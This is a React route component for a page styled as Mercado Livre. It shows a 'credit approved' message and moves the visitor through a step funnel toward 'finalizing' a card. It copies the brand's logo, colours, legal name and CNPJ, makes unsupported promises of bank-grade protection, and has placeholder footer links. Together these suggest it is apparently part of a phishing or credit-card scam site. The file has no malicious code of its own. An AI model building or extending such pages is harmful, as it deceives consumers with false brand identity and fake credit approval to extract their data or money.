import { createFileRoute, useNavigate } from "@tanstack/react-router";
import { useEffect, useState } from "react";
import mlLogo from "@/assets/mercado-livre-logo.png";
import { FunnelSteps } from "@/components/FunnelSteps";

export const Route = createFileRoute("/aprovado")({
  head: () => ({
    meta: [
      { title: "Crédito aprovado - Mercado Livre" },
      { name: "description", content: "Seu crédito foi aprovado. Finalize seu cartão e comece a aproveitar." },
    ],
    links: [
      { rel: "stylesheet", href: "https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" },
    ],
  }),
  component: Aprovado,
});

function Aprovado() {
  const navigate = useNavigate();

  const items = [
    {
      icon: "fa-check",
      text: "Seu limite foi aprovado! Agora vamos personalizar seu cartão exclusivo.",
    },
    {
      icon: "fa-shield-halved",
      text: "Suas informações estão protegidas com criptografia de nível bancário e tecnologia antifraude.",
    },
    {
      icon: "fa-heart",
      text: "Você está a poucos cliques de ter acesso aos melhores benefícios do mercado!",
    },
  ];

  return (
    <div className="min-h-screen bg-[#EEEEEE] flex flex-col relative overflow-hidden">
      {/* Header */}
      <div className="bg-[#FFE600] w-full py-3 flex justify-center items-center shadow-sm">
        <img src={mlLogo} alt="Mercado Livre" className="h-9 object-contain" />
      </div>
      <FunnelSteps current={2} />

      {/* Decorative circles */}
      <div className="absolute w-72 h-72 rounded-full bg-[#FFE600]/20 -top-20 -right-20 z-0" />
      <div className="absolute w-56 h-56 rounded-full bg-[#3483FA]/10 -bottom-16 -left-16 z-0" />

      <main className="flex-1 flex items-start justify-center px-4 py-8 relative z-10">
        <div className="w-full max-w-md bg-white rounded-xl shadow-md p-6 md:p-8">
          <h1 className="text-2xl md:text-3xl font-bold text-gray-800 text-center mb-2">
            Parabéns! Seu crédito foi aprovado
          </h1>
          <p className="text-sm text-gray-600 text-center mb-6">
            Agora é só finalizar seu cartão e começar a aproveitar
          </p>

          <div className="space-y-3 mb-6">
            {items.map((item) => (
              <div
                key={item.text}
                className="flex items-start gap-3 border border-gray-200 rounded-lg p-4"
              >
                <span className="w-10 h-10 rounded-lg bg-[#FFE600] flex items-center justify-center shrink-0">
                  <i className={`fas ${item.icon} text-gray-800`} />
                </span>
                <p className="text-sm text-gray-800 leading-snug pt-1">{item.text}</p>
              </div>
            ))}
          </div>

          <button
            onClick={() => navigate({ to: "/limite" })}
            className="w-full bg-[#3483FA] hover:bg-[#2968C8] text-white text-lg font-semibold py-4 rounded-md transition-all"
          >
            Continuar
          </button>
        </div>
      </main>

      <footer className="text-center text-xs text-gray-500 py-6 relative z-10">
        <p>© 2025 Mercado Instituição de Pagamento Ltda.</p>
        <p className="mt-1">
          CNPJ: 10.573.521/0001-91 ·{" "}
          <a href="#" className="text-[#3483FA]">Termos e condições</a> ·{" "}
          <a href="#" className="text-[#3483FA]">Privacidade</a>
        </p>
      </footer>
    </div>
  );
}
